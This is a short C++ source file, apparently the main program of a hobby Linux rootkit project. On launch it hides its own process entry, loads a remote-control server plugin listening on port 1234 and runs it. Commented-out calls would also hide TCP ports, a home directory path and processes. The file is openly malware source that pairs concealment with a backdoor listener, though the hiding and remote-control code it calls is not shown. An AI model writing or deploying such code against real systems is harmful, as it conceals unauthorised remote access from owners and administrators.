//
// Created by idan on 1/1/24.
//

#include "linux_rootkit.h"
#include <iostream>
#include <unistd.h>

#include "hider/hider.h"

#include "remote_control/remote_control_server.h"

void execute() {
    int mypid = getpid();
    hide_process_dir(mypid);

    linux_rootkit rootkit;

    id_value id = rootkit.load_plugin(std::make_unique<remote_control_server>(1234));
    rootkit.run_plugin(id, false);


//    hide_tcp4_port(1234);
//    hide_tcp6_port(63342);
//    hide_absolute_path("/home/idan/Downloads");
//    hide_process_dir(1234);

//    reports_test();


//    unhide_process_dir(mypid);
}


int main() {
    execute();
}